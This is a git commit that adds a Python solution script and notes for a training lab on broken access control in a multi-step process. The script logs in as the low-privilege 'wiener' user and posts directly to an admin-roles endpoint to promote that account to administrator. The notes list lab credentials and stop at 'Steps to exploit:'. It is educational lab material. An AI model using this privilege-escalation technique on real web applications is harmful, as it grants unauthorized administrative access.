4e3735e74d3141866077e959f122249f50464eac
Rana Khalil <ranakhalil101@gmail.com>
2022-12-22 13:05:06 -0500

    Add files via upload

---
+++ broken-access-control/lab-12/access-control-lab-12.py
@@ -0,0 +1,47 @@
+import requests
+import sys
+import urllib3
+from bs4 import BeautifulSoup
+import re
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}
+
+def upgrade_wiener_user(s, url):
+
+    # login as the wiener user
+    login_url = url + '/login'
+    data_login = {'username': 'wiener', 'password': 'peter'}
+    r = s.post(login_url, data=data_login, verify=False, proxies=proxies)
+    res = r.text
+    if "Log out" in res:
+        print("(+) Successfully logged in as the wiener user...")
+
+        # Upgrade the user to administrator
+        print("(+) Upgrading user to administrator...")
+        upgrade_url = url + "/admin-roles"
+        data_upgrade = {'action': 'upgrade', 'confirmed': 'true', 'username': 'wiener'}
+        r = s.post(upgrade_url, data=data_upgrade, verify=False, proxies=proxies)
+        if r.status_code == 200:
+            print("(+) Successfully upgraded user to administrator.")
+        else:
+            print("(-) Could not upgrade user to administrator.")
+            sys.exit(-1)
+
+    else:
+        print("(-) Could not login as the wiener user.")
+        sys.exit(-1)
+
+def main():
+    if len(sys.argv) != 2:
+        print("(+) Usage: %s <url>" % sys.argv[0])
+        print("(+) Example: %s www.example.com" % sys.argv[0])
+        sys.exit(-1)
+
+    s = requests.Session()
+    url = sys.argv[1]
+    upgrade_wiener_user(s, url)
+
+if __name__ == "__main__":
+    main()
---
+++ broken-access-control/lab-12/notes.txt
@@ -0,0 +1,7 @@
+Lab #12 - Multi-step process with no access control on one step
+
+Target Goal - Exploit the access control flaw to promote the wiener user to administrator
+
+creds: administrator:admin, wiener:peter
+
+Steps to exploit:
